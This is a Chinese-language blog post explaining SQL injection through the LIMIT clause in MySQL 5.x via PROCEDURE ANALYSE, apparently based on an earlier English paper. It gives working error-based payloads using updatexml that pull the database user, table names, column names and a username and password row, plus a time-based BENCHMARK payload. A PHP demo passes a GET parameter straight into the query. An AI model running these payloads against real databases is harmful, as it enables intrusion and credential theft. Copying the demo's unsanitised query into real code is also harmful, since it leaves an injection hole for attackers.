---
layout: post
title: Mysql in Limit Sql Injection
---

{{ page.title }}
================
<p class="date">{{ page.date | date_to_string }} - Tr3jer_CongRong</p>
<center>
<img src="http://ww1.sinaimg.cn/mw690/9c5c5d93tw1erpyb5brduj20go08hgmc.jpg">
</center>

>sql注入在组合拼接方面一直都很灵活,因为语法本身就很灵活,不过Mysql的Limit下一直没办法注入,国外大牛发表了个[SQL Injections in MySQL LIMIT clause](https://rateip.com/blog/sql-injections-in-mysql-limit-clause/)的paper,意在利用Mysql的一个优化建议函数ANALYSE()进行Limit处注入,`此方法适用于Mysql5.x`.

	SELECT freld FROM table WHERE id>0 ORDER BY id LIMIT injection_point
	
**像这样的语句,由于后面跟着`ORDER BY`,所以无法UNION联合查询注入,那么就需要在LIMIT上找出路了**

Mysql5的`SELETCT`语法:

	SELECT 
    [ALL | DISTINCT | DISTINCTROW ] 
      [HIGH_PRIORITY] 
      [STRAIGHT_JOIN] 
      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT] 
      [SQL_CACHE | SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS] 
    select_expr [, select_expr ...] 
    [FROM table_references 
    [WHERE where_condition] 
    [GROUP BY {col_name | expr | position} 
      [ASC | DESC], ... [WITH ROLLUP]] 
    [HAVING where_condition] 
    [ORDER BY {col_name | expr | position} 
      [ASC | DESC], ...] 
    [LIMIT {[offset,] row_count | row_count OFFSET offset}] 
    [PROCEDURE procedure_name(argument_list)] 
    [INTO OUTFILE 'file_name' export_options 
      | INTO DUMPFILE 'file_name' 
      | INTO var_name [, var_name]] 
    [FOR UPDATE | LOCK IN SHARE MODE]]
    
**LIMIT后面跟了两个函数,PROCEDURE和INTO,INTO除非有写入shell的权限，否则是无法利用的,那就看看PROCEDURE函数下能否注入.**

>一个测试表:

<img src="http://7xiw31.com1.z0.glb.clouddn.com/34324b9a.png">

**ANALYSE函数是可以查看表的优化建议**

	PROCEDURE ANALYSE([max_elements,[max_memory]])
	
ANALYSE函数后面可以有两个参数:

	select * from injection where id>0 order by id limit 0,1 procedure analyse(1,1);

<img src="http://ww4.sinaimg.cn/mw690/9c5c5d93tw1erqfqij043j20vo02qdhl.jpg">

看起来并不是很好，尝试下在`max_elements`处添加条件表达式:


	SELECT * from injection where id > 0 order by id LIMIT 1,1 procedure analyse((select IF(MID(version(),1,1) LIKE 5, sleep(5),1)),1);

但是立即返回了一个错误信息:

<img src="http://ww1.sinaimg.cn/mw690/9c5c5d93tw1erqfqhkijbj20vk02u40x.jpg">

>sleep函数没执行,不过还是有办法的,利用updatexml or extractvalue函数进行报错注入:

**爆用户名:**

	select * from injection where id>0 order by id limit 0,1 procedure analyse(updatexml(0,concat(0x7e,user()),0),1);
	
<img src="http://7xiw31.com1.z0.glb.clouddn.com/213h8sad.png">

**爆表:**

	select * from injection where id>0 order by id limit 0,1 procedure analyse(updatexml(0,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)),0),1);

<img src="http://7xiw31.com1.z0.glb.clouddn.com/XA78as89.png">

**爆字段:**

	select * from injection where id>0 order by id limit 0,1 procedure analyse(updatexml(0,concat(0x7e,(select concat(column_name) from information_schema.columns where table_name='injection' limit 0,1)),0),1);
	
<img src="http://7xiw31.com1.z0.glb.clouddn.com/32BSF8.png">

**爆数据:**

	select * from injection where id>0 order by id limit 0,1 procedure analyse(updatexml(0,concat(0x7e,(select concat_ws(':',id,username,password) from injection limit 0,1)),0),1);

<img src="http://7xiw31.com1.z0.glb.clouddn.com/sad782eq.png">

**如果不支持报错注入的话,还可以基于时间注入:**

	SELECT * FROM injection WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);

<img src="http://7xiw31.com1.z0.glb.clouddn.com/3ewg87sdfb.png">

>一个Demo:

 	<?php
	/**
	 * Created by PhpStorm.
	 * User: Tr3jer
	 * Date: 15/1/24
	 * Time: 下午9:55
	 */
	include "Class_Mysql_Db_Model.php";
	
	$cof=new Config();
	$obj=new Mysql_Db_Model();
	$obj->connect($cof);
	
	$sql="select * from injection where id>0 order by id limit 0,{$_GET['id']}";
	
	if($obj->query($sql)){
		var_dump($row);
	}else{
		die(mysql_error());
	}
	
	mysql_close($obj);

<img src="http://7xiw31.com1.z0.glb.clouddn.com/3neiuwyfd.png">

>执行的语句:

<img src="http://7xiw31.com1.z0.glb.clouddn.com/2nuefdys8.png">

>Mysql内建的特性有很多,不过能够利用的缺陷还有待挖掘:)